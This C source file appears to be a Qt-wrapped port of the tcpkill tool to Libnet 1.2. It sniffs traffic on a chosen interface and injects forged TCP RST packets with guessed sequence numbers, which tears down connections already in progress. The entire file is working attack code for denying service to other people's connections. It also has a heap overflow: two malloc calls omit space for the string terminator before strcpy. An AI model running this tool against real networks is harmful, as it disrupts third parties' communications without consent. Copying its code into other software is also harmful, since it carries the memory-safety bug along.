/*
 * tcpkill.c
 *
 * Kill TCP connections already in progress.
 *
 * Copyright (c) 2000 Dug Song <dugsong@monkey.org>
 *
 * $Id: tcpkill.c,v 1.17 2001/03/17 08:10:43 dugsong Exp $
 *
 * Migrated to Libnet 1.2.x by Dotcom
 */

#include "tcpkill.h"

#include <sys/types.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include "pcaputil.h"

#define DEFAULT_SEVERITY	3

int	Opt_severity = DEFAULT_SEVERITY;

//libnet_t *l;
//libnet_ptag_t tcp_id, ip_id;

int	pcap_off;
libnet_t * l;

libnet_ptag_t ip_id;
libnet_ptag_t tcp_id;

static void
tcp_kill_cb(u_char *user, const struct pcap_pkthdr *pcap, const u_char *pkt)
{
    struct libnet_ipv4_hdr *ip;
	struct libnet_tcp_hdr *tcp;
	u_char ctext[64], buf[LIBNET_IPV4_H + LIBNET_TCP_H + 1];
	u_long seq;
	u_short win;
	int i, *sock, len;

	sock = (int *)user;
    pkt += pcap_off;
    len = pcap->caplen - pcap_off;

    fprintf(stderr, "libnet_ipv4_hdr\n");

	ip = (struct libnet_ipv4_hdr *)pkt;
	if (ip->ip_p != IPPROTO_TCP)
		return;
	
	tcp = (struct libnet_tcp_hdr *)(pkt + LIBNET_IPV4_H);
	if (tcp->th_flags & (TH_SYN|TH_FIN|TH_RST))
		return;

    fprintf(stderr, "tcp->th_ack \n");

	seq = ntohl(tcp->th_ack);
	win = ntohs(tcp->th_win);
	

    snprintf((char*)ctext, sizeof(ctext), "%s:%d > %s:%d:",
		 libnet_addr2name4(ip->ip_src.s_addr, 0),
		 ntohs(tcp->th_sport),
		 libnet_addr2name4(ip->ip_dst.s_addr, 0),
         ntohs(tcp->th_dport));
	
	for (i = 0; i < Opt_severity; i++) {
		seq += (i * win);
        fprintf(stderr, "libnet_build_tcp \n");

        tcp_id = libnet_build_tcp(ntohs(tcp->th_dport), ntohs(tcp->th_sport),
                    seq, 0, TH_RST, 0, 0, NULL, LIBNET_TCP_H, NULL,0,l,(libnet_ptag_t ) tcp_id);
	
        ip_id =	libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H, 0, libnet_get_prand(LIBNET_PRu16), 0, 64, IPPROTO_TCP,0,
			ip->ip_dst.s_addr, ip->ip_src.s_addr,0,
            0,l, ip_id);
	

        fprintf(stderr, "libnet_do_checksum \n");

        //libnet_do_checksum(l,buf + LIBNET_IPV4_H, IPPROTO_TCP, LIBNET_TCP_H);
		
        fprintf(stderr, "libnet_write \n");


        if (libnet_write(l) < 0){
            warn("write_ip");
        }
		
		fprintf(stderr, "%s R %lu:%lu(0) win %i\n", ctext, seq, seq,win);
	}
}


//int main(int argc, char *argv[]) {
void tcpkill(QString _intf,QString _filter) {
	extern char *optarg;
	extern int optind;
	int c, sock;
	char *p, *intf, *filter, ebuf[PCAP_ERRBUF_SIZE];
	pcap_t *pd;
	
	intf = NULL;
	
    char errbuf[LIBNET_ERRBUF_SIZE];


    if (l==NULL){
        printf("l init\n");
        l = libnet_init(
            LIBNET_RAW4,    /* or LIBNET_LINK or LIBNET_RAW6 */
            NULL,           /* or device if you using LIBNET_LINK */
            errbuf);
    }

    intf = (char *)malloc(_intf.length());
    strcpy(intf,_intf.toStdString().c_str());

    filter = (char *)malloc(_filter.length());
    strcpy(filter,_filter.toStdString().c_str());


    if ((pd = pcap_init(intf, filter, 64)) == NULL)
		errx(1, "couldn't initialize sniffing");

    if ((sock = libnet_open_raw4(l)) == -1)
		errx(1, "couldn't initialize sending");

    if ((pcap_off = pcap_dloff(pd)) < 0)
        errx(1, "couldn't determine link layer offset");


    libnet_seed_prand(l);



	warnx("listening on %s [%s]", intf, filter);
	
    pcap_loop(pd, 6, tcp_kill_cb, (u_char *)&sock);
  
	/* NOTREACHED */

    //libnet_destroy(l);
	
    //exit(0);
}
